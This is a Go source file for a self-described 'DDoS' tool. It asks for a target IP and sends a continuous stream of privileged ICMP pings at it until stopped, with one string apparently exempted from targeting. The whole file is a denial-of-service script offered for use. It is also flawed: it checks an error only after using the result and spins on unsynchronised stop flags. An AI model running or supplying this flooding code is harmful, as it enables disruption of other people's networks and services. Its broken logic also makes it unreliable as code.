/*
 *           	DDoS  Copyright (C) 2018  Fris
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/sparrc/go-ping"
)

func main() {
	fmt.Println("[Notice] To quit press: CTRL+C")
	timeout := time.After(5 * time.Second)
	for {
		fmt.Println("Please type the ip that you want to DDoS...")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		ip := scanner.Text()
		if len(ip) < 7 || strings.Contains(ip, "legacyhcf") {
			fmt.Println("The ip you've provided is invalid!")
		} else {
			running := true
			stop := false
			go func() {
				fmt.Println("DDoSing the address " + ip + "...")
				for running == true {
					fmt.Print("DDoSing the address ", ip)
					err := ddos(ip)
					if err != nil {
						fmt.Println("Oupsii! Looks like something wrong has happened, Make you sure that the ip you provided is valid.")
						os.Exit(1)
					}
				}
				stop = true
				fmt.Println("Successfully stopped the process!")
			}()
			fmt.Println("Press ENTER to stop the process!")
			scanner.Scan()
			fmt.Println("Stopping the process...")
			running = false
			for !stop {
				fmt.Print("Stopping the process...")
			}
		}
		select {
		case <-timeout:
			fmt.Println("Timed out!")
		}
	}
}

func ddos(ip string) error {
	pinger, err := ping.NewPinger(ip)
	pinger.SetPrivileged(true)
	if err != nil {
		return err
	}
	pinger.Count = 65500
	pinger.Run()
	return nil
}
